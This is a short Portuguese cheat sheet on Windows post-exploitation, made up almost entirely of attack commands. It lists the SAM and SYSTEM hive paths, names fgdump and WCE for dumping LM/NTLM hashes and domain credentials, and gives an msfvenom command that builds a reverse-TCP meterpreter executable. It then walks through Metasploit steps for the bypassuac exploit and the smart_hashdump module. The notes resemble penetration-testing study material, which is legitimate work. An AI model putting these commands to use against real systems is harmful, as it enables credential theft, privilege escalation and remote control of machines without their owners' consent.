# post-exploitation

## Windows XP 
```bash
    SAM: C:\Windows\System32\config\SAM
    SYSTEM: C:\Windows\System32\config\SYSTEM

    SAM: C:\Windows\repair\SAM
    SYSTEM: C:\Windows\repair\SYSTEM

    Comando equivalente no meterpreter: hashdump 
```
### Extraia hashes de senhas armazenados no windows 
```bash
    /usr/share/windows-binaries/fgdump/fgdump.exe
```
### Hashes LM e NTLM
```bash
  /usr/share/windows-binaries/fgdump/fgdump.exe
  type 127.0.0.1.pwdump 
  type 127.0.0.1.cachedump
```
### Obtendo usuário e senha do domínio 
```bash
  /usr/share/wce/wce-universal.exe
```

## Bypass UAC ( Windows 7 em diante ) pelo meterpreter
#### Payload TCP/IP
```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<Porta> -f exe > shell.exe
```
#### Procure pelo exploit bypass UAC
```bash
    background
    search bypassuac 
    msf5 > use exploit/windows/local/bypassuac
```
#### Configure um novo payload 
```bash
    msf5 exploit(windows/local/bypassuac) > set payload windows/x64/meterpreter/reverse_tcp
```
## Dumping de senhas no windowss ( bypass ) 
```bash
    search hashdump 
    use post/windows/gather/smart_hashdump 
```

